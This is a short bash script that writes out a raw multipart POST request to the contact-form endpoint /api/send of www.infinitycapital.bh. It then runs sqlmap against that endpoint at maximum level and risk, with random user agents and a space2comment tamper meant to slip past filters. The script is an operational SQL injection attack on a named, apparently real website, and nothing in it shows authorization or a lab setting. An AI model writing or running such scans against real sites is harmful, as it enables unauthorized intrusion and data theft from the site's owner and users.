#!/bin/bash
# sqlmap on the ONLY real dynamic backend endpoint: POST /api/send (multipart FormData)
cd /work/w45
mkdir -p sq/send
cat > send.req <<'EOF'
POST /api/send HTTP/1.1
Host: www.infinitycapital.bh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIC45
Accept: */*
Origin: https://www.infinitycapital.bh
Referer: https://www.infinitycapital.bh/contact

------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="fname"

sqmptest
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="lname"

sqmptest
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="areacode"

973
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="tel"

1234567
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="cname"

sqmptest
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="subject"

General Inquiry
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="msg"

sqmptest message body 12345
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="check"

1
------WebKitFormBoundaryIC45
Content-Disposition: form-data; name="targets"

contact
------WebKitFormBoundaryIC45--
EOF
sqlmap -r send.req --batch --level=5 --risk=3 --threads=4 --delay=0.3 \
  --random-agent --output-dir=/work/w45/sq/send \
  --ignore-content-length --tamper=space2comment \
  > /work/w45/sq_send.log 2>&1
echo "DONE send rc=$?" >> /work/w45/sq_status.txt
